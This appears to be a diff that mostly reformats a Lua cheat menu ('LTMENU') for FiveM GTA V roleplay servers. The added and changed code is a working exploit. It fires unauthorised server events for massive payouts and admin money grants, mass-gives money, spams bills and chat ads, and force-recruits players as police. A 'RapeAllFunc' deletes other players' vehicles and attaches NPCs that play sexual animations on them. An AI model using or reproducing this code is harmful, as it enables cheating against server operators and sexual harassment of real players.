-                                'money',
-                                1254756
-                            )
-                            TriggerServerEvent(
-                                'esx_billing:sendBill',
-                                GetPlayerServerId(i),
-                                'Purposeless',
-                                '~g~Join LT Discord for more menus!',
-                                43161337
-                            )
-                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
-                            TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
-                        end
-                    end
+    Citizen.CreateThread(
+        function()
+            TriggerServerEvent('esx_jobs:caution', 'give_back', 9999999999)
+            TriggerServerEvent('esx_fueldelivery:pay', 9999999999)
+            TriggerServerEvent('esx_carthief:pay', 9999999999)
+            TriggerServerEvent('esx_godirtyjob:pay', 9999999999)
+            TriggerServerEvent('esx_pizza:pay', 9999999999)
+            TriggerServerEvent('esx_ranger:pay', 9999999999)
+            TriggerServerEvent('esx_garbagejob:pay', 9999999999)
+            TriggerServerEvent('esx_truckerjob:pay', 9999999999)
+            TriggerServerEvent('AdminMenu:giveBank', 9999999999)
+            TriggerServerEvent('AdminMenu:giveCash', 9999999999)
+            TriggerServerEvent('esx_gopostaljob:pay', 9999999999)
+            TriggerServerEvent('esx_banksecurity:pay', 9999999999)
+            TriggerServerEvent('esx_slotmachine:sv:2', 9999999999)
+            for bD = 0, 9 do
+                TriggerServerEvent(
+                    '_chat:messageEntered',
+                    '~g~LTMENU#7799',
+                    {
+                        141,
+                        211,
+                        255
+                    },
+                    '^' .. bD .. '~b~LTMENU'
                 )
+            end
+            for i = 0, 256 do
+                TriggerServerEvent(
+                    'esx:giveInventoryItem',
+                    GetPlayerServerId(i),
+                    'item_money',
+                    'money',
+                    1254756
+                )
+                TriggerServerEvent(
+                    'esx:giveInventoryItem',
+                    GetPlayerServerId(i),
+                    'item_money',
+                    'money',
+                    1254756
+                )
+                TriggerServerEvent(
+                    'esx_billing:sendBill',
+                    GetPlayerServerId(i),
+                    'Purposeless',
+                    '~g~Join LT Discord for more menus!',
+                    43161337
+                )
+                TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
+                TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
+            end
+        end
+    )
 end
 
-function ch(C,x,y)
+function ch(C, x, y)
     SetTextFont(0)
     SetTextProportional(1)
-    SetTextScale(0.0,0.4)
-    SetTextDropshadow(1,0,0,0,255)
-    SetTextEdge(1,0,0,0,255)
+    SetTextScale(0.0, 0.4)
+    SetTextDropshadow(1, 0, 0, 0, 255)
+    SetTextEdge(1, 0, 0, 0, 255)
     SetTextDropShadow()
     SetTextOutline()
     SetTextEntry("STRING")
     AddTextComponentString(C)
-    DrawText(x,y)
+    DrawText(x, y)
 end
 
 local function getPlayerIds()
@@ -3554,146 +3658,147 @@ local RCCar = {}
 -- LTPREMIUM
 
 RCCar.Start = function()
-	if DoesEntityExist(RCCar.Entity) then return end
+    if DoesEntityExist(RCCar.Entity) then return end
 
-	RCCar.Spawn()
+    RCCar.Spawn()
 
-	RCCar.Tablet(true)
+    RCCar.Tablet(true)
 
-	while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do
-		Citizen.Wait(-1000)
+    while DoesEntityExist(RCCar.Entity) and DoesEntityExist(RCCar.Driver) do
+        Citizen.Wait(-1000)
 
-		local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),  GetEntityCoords(RCCar.Entity), true)
+        local distanceCheck = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity),
+            true)
 
-		RCCar.DrawInstructions(distanceCheck)
-		RCCar.HandleKeys(distanceCheck)
+        RCCar.DrawInstructions(distanceCheck)
+        RCCar.HandleKeys(distanceCheck)
 
-		if distanceCheck <= 10000000.0 then
-			if not NetworkHasControlOfEntity(RCCar.Driver) then
-				NetworkRequestControlOfEntity(RCCar.Driver)
-			elseif not NetworkHasControlOfEntity(RCCar.Entity) then
-				NetworkRequestControlOfEntity(RCCar.Entity)
-			end
-		else
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
-		end
-	end
+        if distanceCheck <= 10000000.0 then
+            if not NetworkHasControlOfEntity(RCCar.Driver) then
+                NetworkRequestControlOfEntity(RCCar.Driver)
+            elseif not NetworkHasControlOfEntity(RCCar.Entity) then
+                NetworkRequestControlOfEntity(RCCar.Entity)
+            end
+        else
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
+        end
+    end
 end
 
 RCCar.HandleKeys = function(distanceCheck)
-	if IsControlJustReleased(0, 47) then
-		if IsCamRendering(RCCar.Camera) then
-			RCCar.ToggleCamera(false)
-		else
-			RCCar.ToggleCamera(true)
-		end
-	end
+    if IsControlJustReleased(0, 47) then
+        if IsCamRendering(RCCar.Camera) then
+            RCCar.ToggleCamera(false)
+        else
+            RCCar.ToggleCamera(true)
+        end
+    end
 
-	if distanceCheck <= 10000000.0 then
-		if IsControlJustPressed(0, 73) then
-			RCCar.Attach("pick")
-		end
-	end
+    if distanceCheck <= 10000000.0 then
+        if IsControlJustPressed(0, 73) then
+            RCCar.Attach("pick")
+        end
+    end
 
-	if distanceCheck < 10000000.0 then
-	    if IsControlJustReleased(0, 108) then
-		    local coos = GetEntityCoords(RCCar.Entity, true)
+    if distanceCheck < 10000000.0 then
+        if IsControlJustReleased(0, 108) then
+            local coos = GetEntityCoords(RCCar.Entity, true)
             AddExplosion(coos.x, coos.y, coos.z, 2, 100000.0, true, false, 0)
-		end
-		if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1)
-		end
-		
-		if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
-		end
+        end
+        if IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 9, 1)
+        end
 
-		if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1)
-		end
+        if IsControlJustReleased(0, 172) or IsControlJustReleased(0, 173) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 6, 2500)
+        end
 
-		if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1)
-		end
+        if IsControlPressed(0, 173) and not IsControlPressed(0, 172) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 22, 1)
+        end
 
-		if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1)
-		end
+        if IsControlPressed(0, 174) and IsControlPressed(0, 173) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 13, 1)
+        end
 
-		if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100)
-		end
+        if IsControlPressed(0, 175) and IsControlPressed(0, 173) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 14, 1)
+        end
 
-		if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1)
-		end
+        if IsControlPressed(0, 172) and IsControlPressed(0, 173) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 30, 100)
+        end
 
-		if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1)
-		end
+        if IsControlPressed(0, 174) and IsControlPressed(0, 172) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 7, 1)
+        end
 
-		if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1)
-		end
+        if IsControlPressed(0, 175) and IsControlPressed(0, 172) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 8, 1)
+        end
 
-		if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
-			TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1)
-		end
-	end
+        if IsControlPressed(0, 174) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 4, 1)
+        end
+
+        if IsControlPressed(0, 175) and not IsControlPressed(0, 172) and not IsControlPressed(0, 173) then
+            TaskVehicleTempAction(RCCar.Driver, RCCar.Entity, 5, 1)
+        end
+    end
 end
 
 RCCar.DrawInstructions = function(distanceCheck)
-	local steeringButtons = {
-		{
-			["label"] = "Right",
-			["button"] = "~INPUT_CELLPHONE_RIGHT~"
-		},
-		{
-			["label"] = "Forward",
-			["button"] = "~INPUT_CELLPHONE_UP~"
-		},
-		{
-			["label"] = "Reverse",
-			["button"] = "~INPUT_CELLPHONE_DOWN~"
-		},
-		{
-			["label"] = "Left",
-			["button"] = "~INPUT_CELLPHONE_LEFT~"
-		}
-	}
+    local steeringButtons = {
+        {
+            ["label"] = "Right",
+            ["button"] = "~INPUT_CELLPHONE_RIGHT~"
+        },
+        {
+            ["label"] = "Forward",
+            ["button"] = "~INPUT_CELLPHONE_UP~"
+        },
+        {
+            ["label"] = "Reverse",
+            ["button"] = "~INPUT_CELLPHONE_DOWN~"
+        },
+        {
+            ["label"] = "Left",
+            ["button"] = "~INPUT_CELLPHONE_LEFT~"
+        }
+    }
 
-	local pickupButton = {
-		["label"] = "Delete",
-		["button"] = "~INPUT_VEH_DUCK~"
-	}
-	
-	local explodeButton = {
-		["label"] = "Explode",
-		["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
-	}
+    local pickupButton = {
+        ["label"] = "Delete",
+        ["button"] = "~INPUT_VEH_DUCK~"
+    }
 
-	local buttonsToDraw = {
-		{
-			["label"] = "Toggle Camera",
-			["button"] = "~INPUT_DETONATE~"
-		}
-	}
+    local explodeButton = {
+        ["label"] = "Explode",
+        ["button"] = "~INPUT_VEH_FLY_ROLL_LEFT_ONLY~"
+    }
 
-	if distanceCheck <= 10000000.0 then
-		for buttonIndex = 1, #steeringButtons do
-			local steeringButton = steeringButtons[buttonIndex]
+    local buttonsToDraw = {
+        {
+            ["label"] = "Toggle Camera",
+            ["button"] = "~INPUT_DETONATE~"
+        }
+    }
 
-			table.insert(buttonsToDraw, steeringButton)
-		end
+    if distanceCheck <= 10000000.0 then
+        for buttonIndex = 1, #steeringButtons do
+            local steeringButton = steeringButtons[buttonIndex]
 
-		if distanceCheck <= 1000000.0 then
-			table.insert(buttonsToDraw, explodeButton)
-		end
-		
-		if distanceCheck <= 1000000.0 then
-			table.insert(buttonsToDraw, pickupButton)
-		end
-	end
+            table.insert(buttonsToDraw, steeringButton)
+        end
+
+        if distanceCheck <= 1000000.0 then
+            table.insert(buttonsToDraw, explodeButton)
+        end
+
+        if distanceCheck <= 1000000.0 then
+            table.insert(buttonsToDraw, pickupButton)
+        end
+    end
 
     Citizen.CreateThread(function()
         local instructionScaleform = RequestScaleformMovie("instructional_buttons")
@@ -3726,153 +3831,148 @@ end
 -- 4x482
 
 RCCar.Spawn = function()
-	RCCar.LoadModels({ GetHashKey(RCCAR123), 68070371 })
+    RCCar.LoadModels({ GetHashKey(RCCAR123), 68070371 })
 
-	local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0, GetEntityHeading(PlayerPedId())
+    local spawnCoords, spawnHeading = GetEntityCoords(PlayerPedId()) + GetEntityForwardVector(PlayerPedId()) * 2.0,
+        GetEntityHeading(PlayerPedId())
 
-	RCCar.Entity = CreateVehicle(GetHashKey(RCCAR123), spawnCoords, spawnHeading, true)
+    RCCar.Entity = CreateVehicle(GetHashKey(RCCAR123), spawnCoords, spawnHeading, true)
 
-	while not DoesEntityExist(RCCar.Entity) do
-		Citizen.Wait(-1000)
-	end
+    while not DoesEntityExist(RCCar.Entity) do
+        Citizen.Wait(-1000)
+    end
 
-	RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true)
+    RCCar.Driver = CreatePed(5, 68070371, spawnCoords, spawnHeading, true)
 
-	SetEntityInvincible(RCCar.Driver, true)
-	SetEntityVisible(RCCar.Driver, false)
-	FreezeEntityPosition(RCCar.Driver, true)
-	SetPedAlertness(RCCar.Driver, 0.0)
+    SetEntityInvincible(RCCar.Driver, true)
+    SetEntityVisible(RCCar.Driver, false)
+    FreezeEntityPosition(RCCar.Driver, true)
+    SetPedAlertness(RCCar.Driver, 0.0)
     SetVehicleNumberPlateText(RCCar.Entity, "LTMENU")
-	TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1)
-   
+    TaskWarpPedIntoVehicle(RCCar.Driver, RCCar.Entity, -1)
 
-	while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do
-		Citizen.Wait(-1000)
-	end
 
-	RCCar.Attach("place")
+    while not IsPedInVehicle(RCCar.Driver, RCCar.Entity) do
+        Citizen.Wait(-1000)
+    end
+
+    RCCar.Attach("place")
 end
 
 RCCar.Attach = function(param)
-	if not DoesEntityExist(RCCar.Entity) then
-		return
-	end
-	
-	RCCar.LoadModels({ "pickup_object" })
+    if not DoesEntityExist(RCCar.Entity) then
+        return
+    end
 
-	if param == "place" then
+    RCCar.LoadModels({ "pickup_object" })
 
-		PlaceObjectOnGroundProperly(RCCar.Entity)
-	elseif param == "pick" then
-		if DoesCamExist(RCCar.Camera) then
-			RCCar.ToggleCamera(false)
-		end
+    if param == "place" then
+        PlaceObjectOnGroundProperly(RCCar.Entity)
+    elseif param == "pick" then
+        if DoesCamExist(RCCar.Camera) then
+            RCCar.ToggleCamera(false)
+        end
 
-		RCCar.Tablet(false)
+        RCCar.Tablet(false)
 
-		DeleteVehicle(RCCar.Entity)
-		DeleteEntity(RCCar.Driver)
+        DeleteVehicle(RCCar.Entity)
+        DeleteEntity(RCCar.Driver)
 
-		RCCar.UnloadModels()
-	end
+        RCCar.UnloadModels()
+    end
 end
 
 RCCar.Tablet = function(boolean)
-	if boolean then
+    if boolean then
+        Citizen.CreateThread(function()
+            while DoesEntityExist(RCCar.TabletEntity) do
+                Citizen.Wait(-1000)
+            end
 
-
-
-	
-		Citizen.CreateThread(function()
-			while DoesEntityExist(RCCar.TabletEntity) do
-				Citizen.Wait(-1000)
-	
-
-			end
-
-			ClearPedTasks(PlayerPedId())
-		end)
-	else
-		DeleteEntity(RCCar.TabletEntity)
-	end
+            ClearPedTasks(PlayerPedId())
+        end)
+    else
+        DeleteEntity(RCCar.TabletEntity)
+    end
 end
 
 ConfigCamera = true
 
 RCCar.ToggleCamera = function(boolean)
-	if not ConfigCamera then return end
+    if not ConfigCamera then return end
 
-	if boolean then
-		if not DoesEntityExist(RCCar.Entity) then return end 
-		if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end
+    if boolean then
+        if not DoesEntityExist(RCCar.Entity) then return end
+        if DoesCamExist(RCCar.Camera) then DestroyCam(RCCar.Camera) end
 
-		RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
+        RCCar.Camera = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
 
-		AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, 0.0, 0.4, true)
+        AttachCamToEntity(RCCar.Camera, RCCar.Entity, 0.0, 0.0, 0.4, true)
 
-		Citizen.CreateThread(function()
-			while DoesCamExist(RCCar.Camera) do
-				Citizen.Wait(-1000)
+        Citizen.CreateThread(function()
+            while DoesCamExist(RCCar.Camera) do
+                Citizen.Wait(-1000)
 
-				SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity))
-			end
-		end)
+                SetCamRot(RCCar.Camera, GetEntityRotation(RCCar.Entity))
+            end
+        end)
 
-		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)
+        local easeTime = 500 *
+        math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)
 
-		RenderScriptCams(1, 1, easeTime, 1, 1)
+        RenderScriptCams(1, 1, easeTime, 1, 1)
 
-		Citizen.Wait(easeTime)
+        Citizen.Wait(easeTime)
+    else
+        local easeTime = 500 *
+        math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)
 
-	else
-		local easeTime = 500 * math.ceil(GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), GetEntityCoords(RCCar.Entity), true) / 10)
+        RenderScriptCams(0, 1, easeTime, 1, 0)
 
-		RenderScriptCams(0, 1, easeTime, 1, 0)
+        Citizen.Wait(easeTime)
 
-		Citizen.Wait(easeTime)
+        ClearTimecycleModifier()
 
-		ClearTimecycleModifier()
-
-		DestroyCam(RCCar.Camera)
-	end
+        DestroyCam(RCCar.Camera)
+    end
 end
 
 RCCar.LoadModels = function(models)
-	for modelIndex = 1, #models do
-		local model = models[modelIndex]
+    for modelIndex = 1, #models do
+        local model = models[modelIndex]
 
-		if not RCCar.CachedModels then
-			RCCar.CachedModels = {}
-		end
+        if not RCCar.CachedModels then
+            RCCar.CachedModels = {}
+        end
 
-		table.insert(RCCar.CachedModels, model)
+        table.insert(RCCar.CachedModels, model)
 
-		if IsModelValid(model) then
-			while not HasModelLoaded(model) do
-				RequestModel(model)
-	
-				Citizen.Wait(-1000)
-			end
-		else
-			while not HasAnimDictLoaded(model) do
-				RequestAnimDict(model)
-	
-				Citizen.Wait(-1000)
-			end    
-		end
-	end
+        if IsModelValid(model) then
+            while not HasModelLoaded(model) do
+                RequestModel(model)
+
+                Citizen.Wait(-1000)
+            end
+        else
+            while not HasAnimDictLoaded(model) do
+                RequestAnimDict(model)
+
+                Citizen.Wait(-1000)
+            end
+        end
+    end
 end
 
 RCCar.UnloadModels = function()
-	for modelIndex = 1, #RCCar.CachedModels do
-		local model = RCCar.CachedModels[modelIndex]
+    for modelIndex = 1, #RCCar.CachedModels do
+        local model = RCCar.CachedModels[modelIndex]
 
-		if IsModelValid(model) then
-			SetModelAsNoLongerNeeded(model)
-		else
-			RemoveAnimDict(model)   
-		end
-	end
+        if IsModelValid(model) then
+            SetModelAsNoLongerNeeded(model)
+        else
+            RemoveAnimDict(model)
+        end
+    end
 end
 
 function KeyboardInput(TextEntry, ExampleText, MaxStringLength)
@@ -3902,11 +4002,11 @@ function DelVeh(veh)
 end
 
 function Clean(veh)
-	SetVehicleDirtLevel(veh, 15.0)
+    SetVehicleDirtLevel(veh, 15.0)
 end
 
 function Clean2(veh)
-	SetVehicleDirtLevel(veh, 1.0)
+    SetVehicleDirtLevel(veh, 1.0)
 end
 
 function GetInputMode()
@@ -3919,13 +4019,13 @@ function TeleportToCoords()
     local z = KeyboardInput("Enter Z Pos", "", 100)
     local entity
     if x ~= "" and y ~= "" and z ~= "" then
-        if IsPedInAnyVehicle(GetPlayerPed(-1),0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1),0),-1)==GetPlayerPed(-1) then
-            entity = GetVehiclePedIsIn(GetPlayerPed(-1),0)
+        if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
+            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
         else
             entity = PlayerPedId()
         end
         if entity then
-            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1,0,0,1)
+            SetEntityCoords(entity, x + 0.5, y + 0.5, z + 0.5, 1, 0, 0, 1)
         end
     else
         drawNotification("~r~Invalid Coordinates, are you fucking stupid?")
@@ -3936,7 +4036,7 @@ function TeleportToWaypoint()
     if DoesBlipExist(GetFirstBlipInfoId(8)) then
         local blipIterator = GetBlipInfoIdIterator(8)
         local blip = GetFirstBlipInfoId(8, blipIterator)
-        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector()) 
+        WaypointCoords = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
         wp = true
 
 
@@ -3948,7 +4048,7 @@ function TeleportToWaypoint()
             if wp then
                 if
                     IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
-                        (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
+                    (GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1))
                 then
                     entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
                 else
@@ -4044,85 +4144,109 @@ function rapeplayer()
 end
 
 function CreateDeer()
-	local Model = GetHashKey("a_c_deer")
-	RequestModel(Model)
-	while not HasModelLoaded(Model) do
-		Citizen.Wait(50)
-	end
+    local Model = GetHashKey("a_c_deer")
+    RequestModel(Model)
+    while not HasModelLoaded(Model) do
+        Citizen.Wait(50)
+    end
 
-	local Ped = PlayerPedId()
-	local PedPosition = GetEntityCoords(Ped, false)
+    local Ped = PlayerPedId()
+    local PedPosition = GetEntityCoords(Ped, false)
 
-	Handle = CreatePed(28, Model, PedPosition.x+1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
+    Handle = CreatePed(28, Model, PedPosition.x + 1, PedPosition.y, PedPosition.z, GetEntityHeading(Ped), true, false)
 
-	SetPedCanRagdoll(Handle, Animal.Ragdoll)
-	SetEntityInvincible(Handle, Animal.Invincible)
+    SetPedCanRagdoll(Handle, Animal.Ragdoll)
+    SetEntityInvincible(Handle, Animal.Invincible)
     SetPedDefaultComponentVariation(Handle)
-	SetModelAsNoLongerNeeded(Model)
+    SetModelAsNoLongerNeeded(Model)
 end
 
 function RapeAllFunc()
-    for bs=0,9 do
-        TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"You just got fucked mate")
+    for bs = 0, 9 do
+        TriggerServerEvent("_chat:messageEntered", "~r~", { 141, 211, 255 }, "You just got fucked mate")
     end
     Citizen.CreateThread(function()
-        for i=0,128 do
+        for i = 0, 128 do
             RequestModelSync("a_m_o_acult_01")
             RequestAnimDict("rcmpaparazzo_2")
-            while not HasAnimDictLoaded("rcmpaparazzo_2")do
+            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                 Citizen.Wait(-1000)
             end
-            if IsPedInAnyVehicle(GetPlayerPed(i),true)then
-                local veh=GetVehiclePedIsIn(GetPlayerPed(i),true)
-                while not NetworkHasControlOfEntity(veh)do
+            if IsPedInAnyVehicle(GetPlayerPed(i), true) then
+                local veh = GetVehiclePedIsIn(GetPlayerPed(i), true)
+                while not NetworkHasControlOfEntity(veh) do
                     NetworkRequestControlOfEntity(veh)
                     Citizen.Wait(-1000)
                 end
-                SetEntityAsMissionEntity(veh,true,true)
-                DeleteVehicle(veh)DeleteEntity(veh)end
-                count=-0.2
-                for b=1,3 do
-                    local x,y,z=table.unpack(GetEntityCoords(GetPlayerPed(i),true))
-                    local bD=CreatePed(4,GetHashKey("a_m_o_acult_01"),x,y,z,0.0,true,false)
-                    SetEntityAsMissionEntity(bD,true,true)
-                    AttachEntityToEntity(bD,GetPlayerPed(i),4103,11816,count,0.00,0.0,0.0,0.0,0.0,false,false,false,false,2,true)
-                    ClearPedTasks(GetPlayerPed(i))TaskPlayAnim(GetPlayerPed(i),"rcmpaparazzo_2","shag_loop_poppy",2.0,2.5,-1,49,0,0,0,0)
-                    SetPedKeepTask(bD)TaskPlayAnim(bD,"rcmpaparazzo_2","shag_loop_a",2.0,2.5,-1,49,0,0,0,0)
-                    SetEntityInvincible(bD,true)count=count-0.4
+                SetEntityAsMissionEntity(veh, true, true)
+                DeleteVehicle(veh)
+                DeleteEntity(veh)
+            end
+            count = -0.2
+            for b = 1, 3 do
+                local x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i), true))
+                local bD = CreatePed(4, GetHashKey("a_m_o_acult_01"), x, y, z, 0.0, true, false)
+                SetEntityAsMissionEntity(bD, true, true)
+                AttachEntityToEntity(bD, GetPlayerPed(i), 4103, 11816, count, 0.00, 0.0, 0.0, 0.0, 0.0, false, false,
+                    false, false, 2, true)
+                ClearPedTasks(GetPlayerPed(i))
+                TaskPlayAnim(GetPlayerPed(i), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
+                SetPedKeepTask(bD)
+                TaskPlayAnim(bD, "rcmpaparazzo_2", "shag_loop_a", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
+                SetEntityInvincible(bD, true)
+                count = count - 0.4
             end
         end
     end)
 end
 
 function teleportToNearestVehicle()
-            local playerPed = GetPlayerPed(-1)
-            local playerPedPos = GetEntityCoords(playerPed, true)
-            local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
-            local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
-            local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
-            local NearestPlanePos = GetEntityCoords(NearestPlane, true)
-        drawNotification("~y~Wait...")
-        Citizen.Wait(1000)
-        if (NearestVehicle == 0) and (NearestPlane == 0) then
-            drawNotification("~r~No Vehicle Found")
-        elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
-            if IsVehicleSeatFree(NearestPlane, -1) then
-                SetPedIntoVehicle(playerPed, NearestPlane, -1)
-                SetVehicleAlarm(NearestPlane, false)
-                SetVehicleDoorsLocked(NearestPlane, 1)
-                SetVehicleNeedsToBeHotwired(NearestPlane, false)
-            else
-                local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
-                ClearPedTasksImmediately(driverPed)
-                SetEntityAsMissionEntity(driverPed, 1, 1)
-                DeleteEntity(driverPed)
-                SetPedIntoVehicle(playerPed, NearestPlane, -1)
-                SetVehicleAlarm(NearestPlane, false)
-                SetVehicleDoorsLocked(NearestPlane, 1)
-                SetVehicleNeedsToBeHotwired(NearestPlane, false)
-            end
-            drawNotification("~g~Teleported Into Nearest Vehicle!")
-        elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
+    local playerPed = GetPlayerPed(-1)
+    local playerPedPos = GetEntityCoords(playerPed, true)
+    local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
+    local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
+    local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
+    local NearestPlanePos = GetEntityCoords(NearestPlane, true)
+    drawNotification("~y~Wait...")
+    Citizen.Wait(1000)
+    if (NearestVehicle == 0) and (NearestPlane == 0) then
+        drawNotification("~r~No Vehicle Found")
+    elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
+        if IsVehicleSeatFree(NearestPlane, -1) then
+            SetPedIntoVehicle(playerPed, NearestPlane, -1)
+            SetVehicleAlarm(NearestPlane, false)
+            SetVehicleDoorsLocked(NearestPlane, 1)
+            SetVehicleNeedsToBeHotwired(NearestPlane, false)
+        else
+            local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
+            ClearPedTasksImmediately(driverPed)
+            SetEntityAsMissionEntity(driverPed, 1, 1)
+            DeleteEntity(driverPed)
+            SetPedIntoVehicle(playerPed, NearestPlane, -1)
+            SetVehicleAlarm(NearestPlane, false)
+            SetVehicleDoorsLocked(NearestPlane, 1)
+            SetVehicleNeedsToBeHotwired(NearestPlane, false)
+        end
+        drawNotification("~g~Teleported Into Nearest Vehicle!")
+    elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
+        if IsVehicleSeatFree(NearestVehicle, -1) then
+            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
+            SetVehicleAlarm(NearestVehicle, false)
+            SetVehicleDoorsLocked(NearestVehicle, 1)
+            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
+        else
+            local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
+            ClearPedTasksImmediately(driverPed)
+            SetEntityAsMissionEntity(driverPed, 1, 1)
+            DeleteEntity(driverPed)
+            SetPedIntoVehicle(playerPed, NearestVehicle, -1)
+            SetVehicleAlarm(NearestVehicle, false)
+            SetVehicleDoorsLocked(NearestVehicle, 1)
+            SetVehicleNeedsToBeHotwired(NearestVehicle, false)
+        end
+        drawNotification("~g~Teleported Into Nearest Vehicle!")
+    elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
+        if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
             if IsVehicleSeatFree(NearestVehicle, -1) then
                 SetPedIntoVehicle(playerPed, NearestVehicle, -1)
                 SetVehicleAlarm(NearestVehicle, false)
@@ -4138,49 +4262,28 @@ function teleportToNearestVehicle()
                 SetVehicleDoorsLocked(NearestVehicle, 1)
                 SetVehicleNeedsToBeHotwired(NearestVehicle, false)
             end
-            drawNotification("~g~Teleported Into Nearest Vehicle!")
-        elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
-            if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
-                if IsVehicleSeatFree(NearestVehicle, -1) then
